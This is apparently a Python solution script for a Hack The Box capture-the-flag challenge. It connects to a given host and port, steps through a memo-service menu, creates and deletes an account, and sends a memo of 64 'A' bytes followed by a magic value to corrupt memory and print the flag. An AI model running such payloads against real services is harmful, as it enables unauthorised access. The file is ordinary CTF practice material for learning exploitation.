#!/usr/bin/env python3

import socket
import time
import sys

SLEEP = 0.5

def receive_message(socket):
    return str(socket.recv(1024), "ascii").lower()

def send_message(socket, message):
    socket.send((message + "\n").encode())

if len(sys.argv) != 3:
    print("Usage: %s host port" % sys.argv[0])
    exit()

mappings = {
    "create account" : "1",
    "first name" : "just",
    "last name" : "rubbish",
    "delete account" : "3",
    "add memo" : "4",
    "enter memo" : (("A" * 64) + "fuck"), #fuck == 0x6675636b
    "print flag" : "5"
}

print("Start exploiting...")
correctly_passed = []
s = socket.create_connection((sys.argv[1], sys.argv[2]))
for key in mappings:
    mes = receive_message(s)
    if key in mes:
        correctly_passed.append(key)
        print(" -> correctly passed steps: %d/%d" % (len(correctly_passed), len(mappings)))
        send_message(s, mappings[key])
        time.sleep(SLEEP)
mes = receive_message(s)
flag = "COULD NOT EXTRACT FLAG"
for line in mes.split("\n"):
    if "htb" in line:
        flag = "FLAG: " + line
        break
print("%s" % flag)
